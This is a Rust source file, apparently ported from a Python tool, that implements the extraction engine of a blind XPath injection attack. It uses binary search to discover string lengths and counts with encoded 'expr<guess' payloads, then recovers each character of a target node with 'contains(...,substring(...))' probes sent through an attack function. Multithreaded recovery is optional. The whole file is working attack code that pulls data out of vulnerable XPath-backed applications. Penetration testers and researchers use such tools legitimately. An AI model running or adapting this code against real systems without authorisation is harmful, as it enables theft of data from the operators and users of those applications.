use std::sync::Arc;

use crate::attack::{attack, encode_payload};
use crate::context::{AttackCtx, CharJob, BAD_CHAR, COUNT_OPTIMIZE};
use crate::xml::{to_lower, xml_optimize_character_set_node};

/// BST number discovery. Defaults high=16, low=0 match the Python defaults.
pub fn get_count_bst(expression: &str, high: i64, low: i64, ctx: &Arc<AttackCtx>) -> i64 {
    let cmd = encode_payload(&format!("{}=0", expression), &ctx.config);
    if attack(&cmd, ctx) {
        return 0;
    }

    const MAX_LENGTH: i64 = 10000;
    let mut to_high = false;
    let mut to_low = false;
    let mut high = high;
    let mut low = low;
    let mut guess = (high + low) / 2;

    while guess != low && guess != high {
        if high >= MAX_LENGTH {
            eprintln!(
                "\n#Error: Surpassed max potential {} > {}#",
                expression, MAX_LENGTH
            );
            return MAX_LENGTH;
        }
        let cmd = encode_payload(&format!("{}<{}", expression, guess), &ctx.config);
        if attack(&cmd, ctx) {
            if !to_low {
                low /= 2;
            }
            to_high = true;
            high = guess;
        } else {
            if !to_high {
                high *= 2;
            }
            to_low = true;
            low = guess;
        }
        guess = (high + low) / 2;
    }
    guess
}

/// Build the XPath chars argument, handling the single-quote case with concat().
fn build_chars_xpath(chars: &str, ctx: &Arc<AttackCtx>) -> String {
    if chars.contains('\'') {
        let without_sq: String = chars.chars().filter(|&c| c != '\'').collect();
        format!(
            "concat('{}',\"'\")",
            encode_payload(&without_sq, &ctx.config)
        )
    } else {
        format!("'{}'", encode_payload(chars, &ctx.config))
    }
}

/// BST character discovery across the given character set.
pub fn get_character_bst(
    node: &str,
    position: usize,
    chars: &str,
    ctx: &Arc<AttackCtx>,
) -> char {
    let remove = ['\x0b', '\x0c'];
    let mut chars: String = chars.chars().filter(|c| !remove.contains(c)).collect();

    let node = to_lower(node, &ctx.config);

    // Verify the character is in our set at all
    let use_chars = build_chars_xpath(&chars, ctx);
    let cmd = format!(
        "contains({},substring({},{},1))",
        use_chars, node, position
    );
    if !attack(&encode_payload(&cmd, &ctx.config), ctx) {
        eprintln!(
            "\n#Error: {} at position {} is not in provided character set#",
            node, position
        );
        return BAD_CHAR;
    }

    // BST across character set
    while chars.chars().count() > 1 {
        let char_count = chars.chars().count();
        let half_ceil = (char_count + 1) / 2;
        let half_floor = char_count / 2;
        let down: String = chars.chars().take(half_ceil).collect();
        let up: String = chars.chars().skip(half_floor).collect();

        chars = down;
        let use_chars = build_chars_xpath(&chars, ctx);
        let cmd = format!(
            "contains({},substring({},{},1))",
            use_chars, node, position
        );
        if !attack(&encode_payload(&cmd, &ctx.config), ctx) {
            chars = up;
        }
    }

    chars.chars().next().unwrap_or(BAD_CHAR)
}

/// Retrieve a full string value via BST string-length + per-character BST.
pub fn get_value_bst(node: &str, count: Option<usize>, ctx: &Arc<AttackCtx>) -> String {
    let config = &ctx.config;

    let node = if config.normalize_space {
        format!("normalize-space({})", node)
    } else {
        node.to_string()
    };

    let count = match count {
        Some(c) => c,
        None => get_count_bst(
            &format!("string-length({})", node),
            config.len_high,
            config.len_low,
            ctx,
        ) as usize,
    };

    if count == 0 {
        return String::new();
    }

    let chars = if config.optimize_charset && count >= COUNT_OPTIMIZE {
        xml_optimize_character_set_node(&node, &config.character_set.clone(), ctx)
    } else {
        config.character_set.clone()
    };

    if config.threads == 0 {
        let mut value = String::new();
        for c in 1..=count {
            value.push(get_character_bst(&node, c, &chars, ctx));
        }
        value
    } else {
        // Push all character jobs onto the worker channel
        if let Some(ref tx) = ctx.thread_tx {
            for c in 1..=count {
                let _ = tx.send(CharJob {
                    node: node.clone(),
                    position: c,
                    chars: chars.clone(),
                });
            }
        }
        // Collect results in position order
        let mut value = vec![BAD_CHAR; count];
        if let Some(ref rx) = ctx.result_rx {
            for _ in 0..count {
                if let Ok(result) = rx.recv() {
                    if result.position >= 1 && result.position <= count {
                        value[result.position - 1] = result.ch;
                    }
                }
            }
        }
        value.into_iter().collect()
    }
}
